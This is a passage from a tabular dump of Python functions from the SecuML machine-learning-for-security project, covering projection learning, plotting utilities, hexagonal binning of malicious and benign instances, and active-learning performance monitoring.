        pca_comps -= 0.1
    self.set_num_components()"
ANSSI-FR/SecuML,get_fitting_instances,"def get_fitting_instances(self, instances):
    return instances"
ANSSI-FR/SecuML,gen_input_labels,"def gen_input_labels(self, instances):
    if self.conf.multiclass:
        labels = instances.annotations.get_families()
    else:
        labels = instances.annotations.get_labels()
    labels_values = list(set(labels).difference(set([None])))
    if len(labels_values) < 2:
        raise FewerThanTwoLabels()
    labels = [labels_values.index(x) if x is not None else -1 for x in labels]
    return (labels, instances)"
ANSSI-FR/SecuML,__init__,"def __init__(self, conf):
    SemiSupervisedProjection.__init__(self, conf)
    self.projection = metric_learn.sdml.SDML_Supervised()"
ANSSI-FR/SecuML,set_projection_matrix,"def set_projection_matrix(self):
    self.projection_matrix = np.transpose(self.pipeline['projection'].components_)"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'Semi-supervised projections must be learned with at least two labels.'"
ANSSI-FR/SecuML,__init__,"def __init__(self, conf):
    Projection.__init__(self, conf)"
ANSSI-FR/SecuML,set_projection_matrix,"@abc.abstractmethod
def set_projection_matrix(self):
    return"
ANSSI-FR/SecuML,set_best_params,"def set_best_params(self, instances):
    return"
ANSSI-FR/SecuML,get_fitting_instances,"def get_fitting_instances(self, instances):
    return instances.get_annotated_instances()"
ANSSI-FR/SecuML,gen_input_labels,"def gen_input_labels(self, instances):
    if self.conf.multiclass:
        families_count = instances.annotations.get_families_count()
        drop_ids = []
        for (family, count) in families_count.items():
            if count < 3:
                drop_ids.extend(instances.annotations.get_family_ids(family))
        selected_ids = [i for i in instances.ids.get_ids() if i not in drop_ids]
        selected_instances = instances.get_from_ids(selected_ids)
        labels = selected_instances.annotations.get_families()
    else:
        selected_instances = instances
        labels = selected_instances.annotations.get_labels()
    labels_values = list(set(labels))
    if len(labels_values) < 2:
        raise FewerThanTwoLabels()
    labels = np.array([labels_values.index(x) for x in labels])
    return (labels, selected_instances)"
ANSSI-FR/SecuML,gen_input_params,"def gen_input_params(self, instances):
    fitting_instances = self.get_fitting_instances(instances)
    (labels, fitting_instances) = self.gen_input_labels(fitting_instances)
    features = self.features_preprocessing(fitting_instances)
    return (features, labels)"
ANSSI-FR/SecuML,fit,"def fit(self, instances):
    (features, labels) = self.gen_input_params(instances)
    self.set_best_params(instances)
    self.create_pipeline()
    self.pipeline.fit(features, labels)
    self.set_projection_matrix()
    self.set_num_components()"
ANSSI-FR/SecuML,set_projection_matrix,"@abc.abstractmethod
def set_projection_matrix(self):
    return"
ANSSI-FR/SecuML,gen_input_params,"def gen_input_params(self, instances):
    return self.features_preprocessing(instances)"
ANSSI-FR/SecuML,fit,"def fit(self, instances):
    features = self.gen_input_params(instances)
    self.create_pipeline()
    self.pipeline.fit(features)
    self.set_projection_matrix()
    self.set_num_components()"
ANSSI-FR/SecuML,__init__,"def __init__(self, projection):
    self.projection = projection
    self.class_separation = None"
ANSSI-FR/SecuML,computer_perf,"def computer_perf(self, instances):
    X = instances.features.get_values()
    labels = instances.ground_truth.get_labels()
    if hasattr(self.projection.conf, 'multiclass'):
        if self.projection.conf.multiclass:
            labels = instances.ground_truth.get_families()
    (unique_labels, label_inds) = np.unique(labels, return_inverse=True)
    ratio = 0
    for li in range(len(unique_labels)):
        Xc = X[label_inds == li]
        Xnc = X[label_inds != li]
        ratio += pairwise_distances(Xc).mean() / pairwise_distances(Xc, Xnc).mean()
    self.class_separation = ratio / len(unique_labels)"
ANSSI-FR/SecuML,__init__,"def __init__(self, projection):
    self.class_separation = ClassSeparation(projection)
    self.clustering_evaluation = None"
ANSSI-FR/SecuML,computer_perf,"def computer_perf(self, instances):
    self.class_separation.computer_perf(instances)"
ANSSI-FR/SecuML,final_computations,"def final_computations(self):
    return"
ANSSI-FR/SecuML,display,"def display(self):
    return"
ANSSI-FR/SecuML,__init__,"def __init__(self, projection, output_dir):
    self.projection = projection
    self.output_dir = output_dir"
ANSSI-FR/SecuML,all_hex_bin,"def all_hex_bin(self, instances):
    malicious_ids = instances.annotations.get_annotated_ids(MALICIOUS)
    num_components = instances.features.num_features()
    num_components = min(num_components, 10)
    for i in range(num_components - 1):
        for j in range(i + 1, num_components):
            self.one_hex_bin(instances, i, j, malicious_ids)"
ANSSI-FR/SecuML,one_hex_bin,"def one_hex_bin(self, instances, cx_index, cy_index, malicious_ids):
    x = instances.features.get_values_from_index(cx_index)
    y = instances.features.get_values_from_index(cy_index)
    hex_bin = HexagonalBinning(x, y, instances.ids.get_ids(), 30, malicious_ids)
    hex_bin.compute_binning()
    filename = 'c_%d_%d_hexbin.json' % (cx_index, cy_index)
    output_file = path.join(self.output_dir, filename)
    hex_bin.print_binning(cx_index, cy_index, output_file)"
ANSSI-FR/SecuML,__init__,"def __init__(self, labels, title=None, xlabel=None, ylabel=None):
    self.labels = labels
    self.datasets = []
    self.title = title
    self.xlabel = xlabel
    self.ylabel = ylabel"
ANSSI-FR/SecuML,add_dataset,"def add_dataset(self, dataset):
    self.datasets.append(dataset)"
ANSSI-FR/SecuML,to_json,"def to_json(self, tooltip_data=None):
    json_barplot = {}
    json_barplot['labels'] = self.labels
    json_barplot['datasets'] = []
    if tooltip_data is not None:
        json_barplot['tooltip_data'] = tooltip_data
    for (i, dataset) in enumerate(self.datasets):
        json_dataset = {}
        json_dataset['data'] = [float(x) for x in dataset.values[:, 0]]
        json_dataset['backgroundColor'] = dataset.color
        json_dataset['label'] = dataset.label
        json_barplot['datasets'].append(json_dataset)
    return json_barplot"
ANSSI-FR/SecuML,export_to_json,"def export_to_json(self, filename, tooltip_data=None):
    json_barplot = self.to_json(tooltip_data=tooltip_data)
    with open(filename, 'w') as f:
        json.dump(json_barplot, f, indent=2)"
ANSSI-FR/SecuML,to_png,"def to_png(self, filename, bar_width=0.3):
    plt.clf()
    n_groups = len(self.labels)
    index = np.arange(n_groups)
    num_datasets = len(self.datasets)
    for i in range(num_datasets):
        dataset = self.datasets[i]
        if dataset.error_bars is not None:
            plt.bar(index + i * bar_width, dataset.values, bar_width, color=dataset.color, label=dataset.label, yerr=dataset.error_bars)
        else:
            plt.bar(index + i * bar_width, dataset.values, bar_width, color=dataset.color, label=dataset.label)
    if self.xlabel is not None:
        plt.xlabel(self.xlabel)
    if self.ylabel is not None:
        plt.ylabel(self.ylabel)
    if self.title is not None:
        plt.title(self.title)
    plt.xticks(index + bar_width * float(n_groups) / 2.0, self.labels)
    plt.legend(loc='upper left')
    plt.savefig(filename)
    plt.clf()"
ANSSI-FR/SecuML,to_pgf_plot,"def to_pgf_plot(self, filename):
    with open(filename, 'w') as f:
        f.write('\\begin{tikzpicture}\n\t\\begin{axis} [\n\t\tybar,\n\t\tbar width = 7pt,\n\t\tenlarge y limits = {0.25, upper},\n\t\tenlarge x limits = 0.25,\n\t\tsymbolic x coords={%s}\n\t\tx tick label style={rotate=45, anchor=east},\n' % ','.join(self.labels))
        if self.xlabel is not None:
            f.write('\t\txlabel=\\large %s,\n' % self.xlabel)
        if self.ylabel is not None:
            f.write('\t\tylabel=\\large %s,\n' % self.ylabel)
        if self.title is not None:
            f.write('\t\ttitle = %s,\n' % self.title)
        f.write('\t\tymin = 0.0,\n\t\txlabel near ticks,\n\t\tylabel near ticks,\n\t\tlegend pos = north west,\n\t\tlegend cell align = left\n\t]\n')
        legend = []
        for (i, dataset) in enumerate(self.datasets):
            if dataset.error_bars is None:
                f.write('\t\\addplot[fill=%s, color=%s] coordinates {\n' % (dataset.color, dataset.color))
                for (l, label) in enumerate(self.labels):
                    f.write('\t\t(%s,%s)\n' % (label, str(dataset.values[l])))
                f.write('\t};\n')
            else:
                f.write('\t\\addplot[style={fill=%s, color=%s}, error bars/.cd, error bar style={black}, y dir=both, y explicit] coordinates {\n' % (dataset.color, dataset.color))
                for (l, label) in enumerate(self.labels):
                    f.write('\t\t(%s,%s) +- (%f,%f)\n' % (label, dataset.values[l], dataset.error_bars[l], dataset.error_bars[l]))
                f.write('\t};\n')
            legend.append(dataset.label)
        f.write('\t\\legend{%s}\n\t\\end{axis}\n\\end{tikzpicture}\n' % ','.join(legend))"
ANSSI-FR/SecuML,__init__,"def __init__(self, title=None):
    self.title = title
    self.datasets = []"
ANSSI-FR/SecuML,add_dataset,"def add_dataset(self, dataset):
    self.datasets.append(dataset)"
ANSSI-FR/SecuML,display,"def display(self, output_filename):
    (fig, ax) = plt.subplots(1, 1)
    data = [d.values[:, 0] for d in self.datasets]
    labels = [d.label for d in self.datasets]
    bp = ax.boxplot(data, labels=labels, notch=0, sym='+', vert='1', whis=1.5)
    plt.setp(bp['boxes'], color='black')
    plt.setp(bp['whiskers'], color='black')
    plt.setp(bp['fliers'], color='black', marker='+')
    for i in range(len(self.datasets)):
        box = bp['boxes'][i]
        box_x = []
        box_y = []
        for j in range(5):
            box_x.append(box.get_xdata()[j])
            box_y.append(box.get_ydata()[j])
        box_coords = list(zip(box_x, box_y))
        box_polygon = Polygon(box_coords, facecolor=self.datasets[i].color)
        ax.add_patch(box_polygon)
    if self.title is not None:
        ax.set_title(self.title)
    x_min = np.amin([np.amin(d.values) for d in self.datasets])
    x_max = np.amax([np.amax(d.values) for d in self.datasets])
    ax.set_ylim(x_min - 0.05 * (x_max - x_min), x_max + 0.05 * (x_max - x_min))
    fig.savefig(output_filename)
    plt.close(fig)"
ANSSI-FR/SecuML,__init__,"def __init__(self, values, label, xvalues=None, error_bars=None):
    self._set_values(values)
    self.label = label
    self.xvalues = xvalues
    self.error_bars = error_bars
    self._set_default_values()"
ANSSI-FR/SecuML,_set_values,"def _set_values(self, values):
    self.values = values
    if len(self.values.shape) == 1:
        new_shape = (self.values.shape[0], 1)
        if isinstance(self.values, spmatrix):
            self.values = self.values.reshape(new_shape)
        else:
            self.values = np.reshape(self.values, new_shape)"
ANSSI-FR/SecuML,set_color,"def set_color(self, color):
    self.color = color"
ANSSI-FR/SecuML,set_linewidth,"def set_linewidth(self, linewidth):
    self.linewidth = linewidth"
ANSSI-FR/SecuML,set_linestyle,"def set_linestyle(self, linestyle):
    self.linestyle = linestyle"
ANSSI-FR/SecuML,set_marker,"def set_marker(self, marker):
    self.marker = marker"
ANSSI-FR/SecuML,_set_default_values,"def _set_default_values(self):
    self.color = get_label_color(self.label)
    self.linewidth = 3
    self.linestyle = 'solid'
    self.marker = 'o'"
ANSSI-FR/SecuML,__init__,"def __init__(self, values_lists, label, xvalues=None):
    values_matrix = values_lists
    values = self._compute_values(values_matrix)
    error_bars = self._compute_error_bars(values_matrix)
    PlotDataset.__init__(self, values, label, xvalues=xvalues, error_bars=error_bars)"
ANSSI-FR/SecuML,_compute_values,"def _compute_values(self, values_matrix):
    return np.mean(values_matrix, axis=0)"
ANSSI-FR/SecuML,_compute_error_bars,"def _compute_error_bars(self, values_matrix):
    std = np.std(values_matrix, axis=0)
    return 1.96 * std / math.sqrt(values_matrix.shape[0])"
ANSSI-FR/SecuML,__init__,"def __init__(self, num_points=200, bandwidth=0.3, title=None, min_value=None, max_value=None):
    self.num_points = num_points
    self.bandwidth = bandwidth
    self.title = title
    self.datasets = []
    self.min_value = min_value
    self.max_value = max_value"
ANSSI-FR/SecuML,add_dataset,"def add_dataset(self, dataset):
    self.datasets.append(dataset)
    min_value = np.amin(dataset.values)
    max_value = np.amax(dataset.values)
    if self.min_value is None:
        self.min_value = min_value
    else:
        self.min_value = min(self.min_value, min_value)
    if self.max_value is None:
        self.max_value = max_value
    else:
        self.max_value = max(self.max_value, max_value)"
ANSSI-FR/SecuML,display,"def display(self, output_filename):
    (fig, self.ax) = plt.subplots(1, 1)
    self.kde = KernelDensity(kernel='gaussian', bandwidth=self.bandwidth)
    has_legend = False
    for dataset in self.datasets:
        self._display_dataset(dataset)
        if dataset.label is not None:
            has_legend = True
    if self.title is not None:
        self.ax.set_xlabel(self.title)
    self.ax.set_ylabel('Density')
    if has_legend:
        self.ax.legend(bbox_to_anchor=(0.0, 1.02, 1.0, 0.102), loc=3, ncol=3, mode='expand', borderaxespad=0.0)
    fig.savefig(output_filename)
    plt.close(fig)"
ANSSI-FR/SecuML,_display_dataset,"def _display_dataset(self, dataset):
    eps = 1e-05
    linewidth = dataset.linewidth
    delta = self.max_value - self.min_value
    density_delta = 1.2 * delta
    if delta > 0:
        x = np.arange(self.min_value - 0.1 * delta, self.max_value + 0.1 * delta, density_delta / self.num_points)
    else:
        x = np.array([self.min_value - 2 * eps, self.max_value + 2 * eps])
    if isinstance(dataset.values, spmatrix):
        variance = mean_variance_axis(dataset.values, axis=0)[1]
    else:
        variance = np.var(dataset.values)
    if variance < eps:
        linewidth += 2
        mean = np.mean(dataset.values)
        x = np.sort(np.append(x, [mean, mean - eps, mean + eps]))
        density = [1 if v == mean else 0 for v in x]
    else:
        self.kde.fit(dataset.values)
        x_density = [[y] for y in x]
        log_density = self.kde.score_samples(x_density).tolist()
        density = list(map(math.exp, log_density))
    self.ax.plot(x, density, label=dataset.label, color=dataset.color, linewidth=linewidth, linestyle=dataset.linestyle)"
ANSSI-FR/SecuML,translate,"def translate(point, translation):
    [x, y] = point
    [tx, ty] = translation
    [x_trans, y_trans] = [x + tx, y + ty]
    return [x_trans, y_trans]"
ANSSI-FR/SecuML,scale,"def scale(point, scaling):
    [x, y] = point
    [sx, sy] = scaling
    [x_scaled, y_scaled] = [x * sx, y * sy]
    return [x_scaled, y_scaled]"
ANSSI-FR/SecuML,__init__,"def __init__(self, lattice, size, xmin, ymin, i, j):
    self.lattice = lattice
    self.size = size
    self.xmin = xmin
    self.ymin = ymin
    self.i = i
    self.j = j
    self.malicious_ids = []
    self.ok_ids = []"
ANSSI-FR/SecuML,has_instances,"def has_instances(self):
    return len(self.malicious_ids) + len(self.ok_ids) > 0"
ANSSI-FR/SecuML,add_data,"def add_data(self, index, malicious_ids):
    if index in malicious_ids:
        self.malicious_ids.append(index)
    else:
        self.ok_ids.append(index)"
ANSSI-FR/SecuML,center,"def center(self):
    [x_center, y_center] = [0, 0]
    if self.lattice == 1:
        x_center = self.i + 0.5
        y_center = 3 * self.j + 0.5
    else:
        x_center = self.i
        y_center = 3 * self.j + 2
    return [x_center, y_center]"
ANSSI-FR/SecuML,hexagon,"def hexagon(self):
    hexag = []
    c = self.center()
    nodes = [[-0.5, 0.5], [0, 1], [0.5, 0.5], [0.5, -0.5], [0, -1], [-0.5, -0.5]]
    for node in nodes:
        hexag.append(translate(scale(translate(c, node), [math.sqrt(3) * self.size, self.size]), [self.xmin, self.ymin]))
    return hexag"
ANSSI-FR/SecuML,to_json,"def to_json(self):
    json = {}
    json['hexagon'] = self.hexagon()
    json['center'] = translate(scale(self.center(), [math.sqrt(3) * self.size, self.size]), [self.xmin, self.ymin])
    json['num_malicious_instances'] = len(self.malicious_ids)
    json['num_ok_instances'] = len(self.ok_ids)
    json['malicious_instances'] = [int(x) for x in self.malicious_ids]
    json['ok_instances'] = [int(x) for x in self.ok_ids]
    num_instances = len(self.malicious_ids) + len(self.ok_ids)
    json['prop_malicious'] = len(self.malicious_ids) / num_instances
    return json"
ANSSI-FR/SecuML,__init__,"def __init__(self, x, y, ids, nx, malicious_ids):
    self.malicious_ids = set(malicious_ids)
    self.x = np.array(x, float)
    self.y = np.array(y, float)
    self.ids = ids
    self.xmin = np.amin(x)
    self.xmax = np.amax(x)
    self.ymin = np.amin(y)
    self.ymax = np.amax(y)
    (self.xmin, self.xmax) = mtrans.nonsingular(self.xmin, self.xmax, expander=0.1)
    (self.ymin, self.ymax) = mtrans.nonsingular(self.ymin, self.ymax, expander=0.1)
    padding = 1e-09 * (self.xmax - self.xmin)
    self.xmin -= padding
    self.xmax += padding
    if self.xmax - self.xmin < epsilon:
        self.xmin -= epsilon / 2
        self.xmax += epsilon / 2
    if self.ymax - self.ymin < epsilon:
        self.ymin -= epsilon / 2
        self.ymax += epsilon / 2
    self.nx = nx
    self.size = (self.xmax - self.xmin) / self.nx
    self.nx = int(math.ceil((self.xmax - self.xmin) / (math.sqrt(3) * self.size))) + 1
    self.ny = int(math.ceil((self.ymax - self.ymin) / self.size)) + 1
    self.x_scale = (self.x - self.xmin) / (self.size * math.sqrt(3))
    self.y_scale = (self.y - self.ymin) / self.size"
ANSSI-FR/SecuML,compute_binning,"def compute_binning(self):
    i_1 = np.round(self.x_scale - 0.5).astype(int)
    j_1 = np.round((self.y_scale - 0.5) / 3).astype(int)
    i_2 = np.round(self.x_scale).astype(int)
    j_2 = np.round((self.y_scale - 2) / 3).astype(int)
    x_1 = i_1 + 0.5
    y_1 = 3 * j_1 + 0.5
    x_2 = i_2
    y_2 = 3 * j_2 + 2
    d1 = 3 * (self.x_scale - x_1) ** 2 + (self.y_scale - y_1) ** 2
    d2 = 3 * (self.x_scale - x_2) ** 2 + (self.y_scale - y_2) ** 2
    bdist = d1 < d2
    self.lattice1 = np.empty((self.nx, self.ny), dtype=object)
    self.lattice2 = np.empty((self.nx, self.ny), dtype=object)
    for i in range(self.nx):
        for j in range(self.ny):
            self.lattice1[i, j] = HexagonalBin(1, self.size, self.xmin, self.ymin, i, j)
            self.lattice2[i, j] = HexagonalBin(2, self.size, self.xmin, self.ymin, i, j)
    for i in range(len(self.x)):
        if bdist[i]:
            self.lattice1[i_1[i], j_1[i]].add_data(self.ids[i], self.malicious_ids)
        else:
            self.lattice2[i_2[i], j_2[i]].add_data(self.ids[i], self.malicious_ids)"
ANSSI-FR/SecuML,print_binning,"def print_binning(self, pc_x_index, pc_y_index, output_file):
    with open(output_file, 'w') as f:
        k = 0
        f.write('[\n')
        min_max = {'xmin': self.xmin, 'xmax': self.xmax, 'ymin': self.ymin, 'ymax': self.ymax}
        json.dump(min_max, f)
        f.write(',')
        for i in range(self.nx):
            for j in range(self.ny):
                if self.lattice1[i, j].has_instances():
                    if k != 0:
                        f.write(',')
                    json.dump(self.lattice1[i, j].to_json(), f, sort_keys=True)
                    k += 1
                if self.lattice2[i, j].has_instances():
                    if k != 0:
                        f.write(',')
                    json.dump(self.lattice2[i, j].to_json(), f, sort_keys=True)
                    k += 1
        f.write('\n]')"
ANSSI-FR/SecuML,__init__,"def __init__(self, datasets, logger, num_bins=10, title=None, xlabel=None, ylabel=None):
    self.logger = logger
    bin_edges = self._get_bin_edges(datasets, num_bins)
    x_labels = ['%f - %f' % (bin_edges[e], bin_edges[e + 1]) for e in range(len(bin_edges) - 1)]
    BarPlot.__init__(self, x_labels, title=title, xlabel=xlabel, ylabel=ylabel)
    for (label, dataset) in datasets.items():
        if dataset.values.shape[0] > 0:
            (hist, _) = np.histogram(dataset.values, bins=bin_edges, density=False)
            hist_dataset = PlotDataset(hist, label)
            hist_dataset.set_color(dataset.color)
            BarPlot.add_dataset(self, hist_dataset)"
ANSSI-FR/SecuML,_get_bin_edges,"def _get_bin_edges(self, datasets, num_bins):
    all_values = None
    for (kind, dataset) in datasets.items():
        if all_values is None:
            all_values = dataset.values
        else:
            all_values = np.vstack((all_values, dataset.values))
    if all_values.min() == all_values.max() and all_values.max() >= 2 ** 53:
        np.clip(all_values, None, 2 ** 53 - 1, out=all_values)
        self.logger.warning('The values of the histogram have been caped to 2**53-1 to deal with numpy issue #8627. ')
    (_, bin_edges) = np.histogram(all_values, bins=num_bins, density=False)
    return bin_edges"
ANSSI-FR/SecuML,__init__,"def __init__(self, title=None, xlabel=None, ylabel=None, xmin=None, xmax=None, ymin=None, ymax=None):
    self.datasets = []
    self.title = title
    self.xlabel = xlabel
    self.ylabel = ylabel
    self.xmin = xmin
    self.xmax = xmax
    self.ymin = ymin
    self.ymax = ymax"
ANSSI-FR/SecuML,add_dataset,"def add_dataset(self, dataset):
    self.datasets.append(dataset)"
ANSSI-FR/SecuML,to_png,"def to_png(self, filename):
    plt.clf()
    for dataset in self.datasets:
        if dataset.error_bars is not None:
            plt.errorbar(dataset.xvalues, dataset.values, yerr=dataset.error_bars, label=dataset.label)
        else:
            plt.plot(dataset.xvalues, dataset.values, label=dataset.label)
    if self.xlabel is not None:
        plt.xlabel(self.xlabel)
    if self.ylabel is not None:
        plt.ylabel(self.ylabel)
    if self.title is not None:
        plt.title(self.title)
    plt.legend(loc='lower right')
    plt.savefig(filename)
    plt.clf()"
ANSSI-FR/SecuML,to_pgf_plot,"def to_pgf_plot(self, filename, standalone=False):
    with open(filename, 'w') as f:
        if standalone:
            f.write('\\documentclass[crop]{standalone}\n')
            f.write('\\usepackage{pgfplots}\n')
            f.write('\\usepackage{tikz}\n')
            f.write('\\begin{document}\n')
        f.write('\\begin{tikzpicture}\n\t\\begin{axis} [\n')
        if self.xlabel is not None:
            f.write('\t\txlabel=\\large %s,\n' % self.xlabel)
        if self.ylabel is not None:
            f.write('\t\tylabel=\\large %s,\n' % self.ylabel)
        if self.title is not None:
            f.write('\t\ttitle = %s,\n' % self.title)
        for limit in ['xmin', 'xmax', 'ymin', 'ymax']:
            if getattr(self, limit) is not None:
                f.write('\t\t%s = %f,\n' % (limit, getattr(self, limit)))
        f.write('\t\txlabel near ticks,\n\t\tylabel near ticks,\n\t\tlegend pos = south east,\n\t\tlegend cell align = left\n\t]\n')
        for dataset in self.datasets:
            f.write('\t\\addplot[color=%s, mark=none, ultra thick, dashdotted] coordinates {\n' % dataset.label)
            for (x, y) in zip(dataset.xvalues, dataset.values):
                f.write('\t\t(%f,%f)\n' % (x, y))
            f.write('\t};\n')
            f.write('\t\\definecolor{%s}{HTML}{%s}\n' % (dataset.label, dataset.color[1:].upper()))
            f.write('\t\\addlegendentry{%s}\n' % dataset.label)
            if dataset.error_bars is not None:
                f.write('\t\\addplot[color=%s, only marks, error bars/y dir=both, error bars/y explicit, mark options={%s}, forget plot]coordinates {\n' % (dataset.label, dataset.label))
                for (x, y, err) in zip(dataset.xvalues, dataset.values, dataset.error_bars):
                    f.write('\t\t(%f,%f) +- (0,%f)\n' % (x, y, err))
                f.write('\t};\n')
        f.write('\t\\end{axis}\n\\end{tikzpicture}\n')
        if standalone:
            f.write('\\end{document}\n')"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration):
    self.iteration = iteration"
ANSSI-FR/SecuML,generate,"def generate(self):
    return"
ANSSI-FR/SecuML,export,"def export(self, al_dir, iter_dir):
    (monitoring_dir, evolution_file) = self._get_output_dirs(al_dir, iter_dir)
    self._display_csv_line(evolution_file)
    self._plot_evolution(evolution_file, monitoring_dir)"
ANSSI-FR/SecuML,_display_csv_line,"def _display_csv_line(self, evolution_file):
    if self.iteration.iter_num == 1:
        self._display_csv_header(evolution_file)
    with open(evolution_file, 'a') as f:
        v = [self.iteration.iter_num]
        v.extend(self.iteration.strategy.get_exec_times())
        csv_writer = csv.writer(f)
        csv_writer.writerow(v)"
ANSSI-FR/SecuML,_display_csv_header,"def _display_csv_header(self, evolution_file):
    with open(evolution_file, 'w') as f:
        header = ['iteration']
        header.extend(self.iteration.strategy.get_exec_times_header())
        csv_writer = csv.writer(f)
        csv_writer.writerow(header)"
ANSSI-FR/SecuML,_load_evolution,"def _load_evolution(self, evolution_file):
    with open(evolution_file, 'r') as f:
        data = pd.read_csv(f, header=0, index_col=0)
        return data"
ANSSI-FR/SecuML,_plot_evolution,"def _plot_evolution(self, evolution_file, monitoring_dir):
    data = self._load_evolution(evolution_file)
    iterations = list(range(1, self.iteration.iter_num + 1))
    plt.clf()
    max_value = data.max().max()
    monitoring = self.iteration.strategy.get_exec_times_display()
    header = self.iteration.strategy.get_exec_times_header()
    for (i, m) in enumerate(monitoring):
        label = header[i]
        plt.plot(iterations, data[label], label=m.label, linestyle=m.linestyle, color=m.color, linewidth=m.linewidth, marker=m.marker)
    plt.ylim(0, max_value)
    plt.xlabel('Iteration')
    plt.ylabel('Execution Time (seconds)')
    lgd = plt.legend(bbox_to_anchor=(0.0, 1.02, 1.0, 0.102), loc=3, ncol=2, mode='expand', borderaxespad=0.0, fontsize='large')
    filename = path.join(monitoring_dir, 'execution_times.png')
    plt.savefig(filename, bbox_extra_artists=(lgd,), bbox_inches='tight')
    filename = path.join(monitoring_dir, 'execution_times.eps')
    plt.savefig(filename, bbox_extra_artists=(lgd,), bbox_inches='tight', dpi=1000, format='eps')
    plt.clf()"
ANSSI-FR/SecuML,_get_output_dirs,"def _get_output_dirs(self, al_dir, iteration_dir):
    monitoring_dir = iteration_dir
    evolution_file = path.join(al_dir, 'execution_times.csv')
    return (monitoring_dir, evolution_file)"
ANSSI-FR/SecuML,__init__,"def __init__(self, iter_num, perf_indicators, multiclass, kind):
    self.iter_num = iter_num
    self.kind = kind
    self.perf_indicators = perf_indicators
    self.multiclass = multiclass"
ANSSI-FR/SecuML,get_evol_file,"def get_evol_file(self, evolution_dir):
    filename = '_'.join([self.kind, 'perf_monitoring.csv'])
    return path.join(evolution_dir, filename)"
ANSSI-FR/SecuML,generate,"def generate(self):
    return"
ANSSI-FR/SecuML,export,"def export(self, monitoring_dir, evolution_dir):
    evolution_file = self.get_evol_file(evolution_dir)
    self.display_csv_line(evolution_file)
    self.plot_evolution(evolution_file, monitoring_dir)"
ANSSI-FR/SecuML,display_csv_line,"def display_csv_line(self, evolution_file):
    if self.iter_num == 1:
        self.display_csv_header(evolution_file)
    with open(evolution_file, 'a') as f:
        v = [self.iter_num]
        v.extend(self.perf_indicators.get_csv_line())
        csv_writer = csv.writer(f)
        csv_writer.writerow(v)"
ANSSI-FR/SecuML,display_csv_header,"def display_csv_header(self, evolution_file):
    with open(evolution_file, 'w') as f:
        header = ['iteration']
        header.extend(self.perf_indicators.get_csv_header())
        csv_writer = csv.writer(f)
        csv_writer.writerow(header)"
ANSSI-FR/SecuML,load_evolution,"def load_evolution(self, evolution_file):
    with open(evolution_file, 'r') as f:
        data = pd.read_csv(f, header=0, index_col=0)
        return data"
ANSSI-FR/SecuML,plot_evolution,"def plot_evolution(self, evolution_file, monitoring_dir):
    data = self.load_evolution(evolution_file)
    if self.multiclass:
        self.plot_perf_evolution(['accuracy'], 'accuracy', data, monitoring_dir)
    else:
        self.plot_perf_evolution(['auc'], 'auc', data, monitoring_dir)"
ANSSI-FR/SecuML,plot_perf_evolution,"def plot_perf_evolution(self, estimators, output_filename, data, output_dir):
    iterations = list(range(1, self.iter_num + 1))
    plt.clf()
    for estimator in estimators:
        plot = PlotDataset(data[estimator].values, estimator)
        plt.plot(iterations, plot.values, label=plot.label, color=plot.color, linewidth=plot.linewidth, marker=plot.marker)
    plt.ylim(0, 1)
    plt.xlabel('Iteration')
    plt.ylabel('Performance')
    lgd = plt.legend(bbox_to_anchor=(0.0, 1.02, 1.0, 0.102), loc=3, ncol=3, mode='expand', borderaxespad=0.0, fontsize='large')
    filename = path.join(output_dir, '%s.png' % self.kind)
    plt.savefig(filename, bbox_extra_artists=(lgd,), bbox_inches='tight')
    plt.clf()"
ANSSI-FR/SecuML,__init__,"def __init__(self, iter_num, diadem_exp, with_validation):
    self.iter_num = iter_num
    train_exp = diadem_exp.get_train_exp()
    train_detect_exp = diadem_exp.get_detection_exp('train')
    detect_exp = diadem_exp.get_detection_exp('test')
    kinds = {}
    kinds['train'] = train_detect_exp.monitoring
    if train_exp.monitoring.cv_monitoring is not None:
        kinds['cv'] = train_exp.monitoring.cv_monitoring.detect_monitoring
    if detect_exp.monitoring.has_ground_truth:
        kinds['test'] = detect_exp.monitoring
    if with_validation:
        validation_exp = diadem_exp.get_detection_exp('validation')
        if validation_exp.monitoring.has_ground_truth:
            kinds['validation'] = validation_exp.monitoring
    self.monitorings = {}
    multiclass = train_exp.exp_conf.core_conf.multiclass
    for (k, diadem_monitoring) in kinds.items():
        perf_indicators = diadem_monitoring.performance.perf_indicators
        self.monitorings[k] = _ModelPerfEvolution(iter_num, perf_indicators, multiclass, k)"
ANSSI-FR/SecuML,generate,"def generate(self):
    for (_, monitoring) in self.monitorings.items():
        monitoring.generate()"
ANSSI-FR/SecuML,export,"def export(self, monitoring_dir, evolution_dir):
    (monitoring_dir, evolution_dir) = self._get_output_dirs(monitoring_dir, evolution_dir)
    for (_, monitoring) in self.monitorings.items():
        monitoring.export(monitoring_dir, evolution_dir)"
ANSSI-FR/SecuML,_get_output_dirs,"def _get_output_dirs(self, iteration_dir, al_dir):
    monitoring_dir = self._get_monitoring_dir(iteration_dir)
    evolution_dir = self._get_evoluation_dir(al_dir)
    return (monitoring_dir, evolution_dir)"
ANSSI-FR/SecuML,_get_monitoring_dir,"def _get_monitoring_dir(self, iteration_dir):
    monitoring_dir = path.join(iteration_dir, 'model_perf')
    os.makedirs(monitoring_dir)
    return monitoring_dir"
ANSSI-FR/SecuML,_get_evoluation_dir,"def _get_evoluation_dir(self, al_dir):
    evolution_dir = path.join(al_dir, 'model_perf')
    if self.iter_num == 1:
        os.makedirs(evolution_dir)
    return evolution_dir"
ANSSI-FR/SecuML,annotate_auto,"def annotate_auto(self, iteration, kind):
    instances = iteration.datasets.instances
    (label, family) = instances.ground_truth.get_label_family(self.instance_id)
    self.update_datasets(iteration, label, family)
    if kind is not None:
        method = '%s__annotation' % kind
    else:
        method = 'annotation'
    annotations_conf = iteration.exp.exp_conf.annotations_conf
    annotations_db_tools.add_annotation(iteration.exp.session, annotations_conf.annotations_id, self.instance_id, label, family, iteration.iter_num, method)"
ANSSI-FR/SecuML,get_manual_annotation,"def get_manual_annotation(self, iteration):
    annotations_conf = iteration.exp.exp_conf.annotations_conf
    annotations_type = annotations_conf.annotations_type
    annotations_id = annotations_conf.annotations_id
    dataset_id = iteration.exp.exp_conf.dataset_conf.dataset_id
    annotation = annotations_db_tools.get_annotation(iteration.exp.session, annotations_type, annotations_id, dataset_id, self.instance_id)
    if annotation is None:
        iteration.conf.logger.info('Instance %s has not been annotated.' % str(self.instance_id))
    else:
        (label, family) = annotation
        self.update_datasets(iteration, label, family)"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, conf):
    CoreAladinQueries.__init__(self, iteration, conf)
